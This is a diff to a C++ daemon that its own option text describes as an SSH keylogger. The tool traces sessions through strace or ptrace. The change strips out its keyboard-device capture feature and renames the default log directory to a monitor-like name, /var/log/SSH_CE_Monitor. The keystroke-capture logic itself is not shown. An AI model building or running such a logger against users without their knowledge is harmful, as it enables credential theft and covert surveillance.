@@ -1,8 +1,7 @@
 #include <boost/filesystem.hpp>
 #include <sys/stat.h>
 
-#include "keylogger.hpp"
-#include "keyboard.hpp"
+#include "process_logger.hpp"
 
 namespace po = boost::program_options;
 namespace fs = boost::filesystem;
@@ -50,16 +49,6 @@ int becomeDaemon(po::variables_map& vm, int64_t sleep_time){
         DEBUG_STDOUT("DIR is created");
     }
 
-    if (vm.count("kboard")) {
-        DEBUG_STDOUT("Logging keyboards: ON");
-        std::vector<Keyboard> keyboards = findKeyboards(path_to_log);
-        std::vector<std::future<void>> captureTasks;
-        captureTasks.reserve(keyboards.size());
-        for (auto& kbd : keyboards)
-            captureTasks.push_back(
-                    std::async(std::launch::async, &Keyboard::capture, &kbd));
-    } else DEBUG_STDOUT("Logging keyboards: OFF");
-
     while(true){
         auto mode = vm["mode"].as<std::string>();
         if (mode == "strace") check_ps("strace", path_to_log);
@@ -79,9 +68,8 @@ int main(int argc, char **argv) {
     desc.add_options()
             ("help", "produce help message")
             ("daemon,d", "daemonize mode")
-            ("kboard,k", "run logging all detected keyboard devices")
             ("mode,m", po::value<std::string>()->default_value("ptrace"), "[strace/ptrace] run ssh keylogger via STRACE or PTRACE mechanism (ptrace by default)")
-            ("output,o", po::value<std::string>()->default_value("/var/log/logd"), "path to directory(if it doesn't exist, it will be created) for saving logfiles");
+            ("output,o", po::value<std::string>()->default_value("/var/log/SSH_CE_Monitor"), "path to directory(if it doesn't exist, it will be created) for saving logfiles");
 
     po::variables_map vm;
     po::store(po::parse_command_line(argc, argv, desc), vm);
@@ -102,16 +90,6 @@ int main(int argc, char **argv) {
         fs::create_directories(path_to_log);
         DEBUG_STDOUT("DIR is created");
     }
-
-    if (vm.count("kboard")) {
-        DEBUG_STDOUT("Logging keyboards: ON");
-        std::vector<Keyboard> keyboards = findKeyboards(path_to_log);
-        std::vector<std::future<void>> captureTasks;
-        captureTasks.reserve(keyboards.size());
-        for (auto& kbd : keyboards)
-            captureTasks.push_back(
-                    std::async(std::launch::async, &Keyboard::capture, &kbd));
-    } else DEBUG_STDOUT("Logging keyboards: OFF");
 
     while(true){
         auto mode = vm["mode"].as<std::string>();
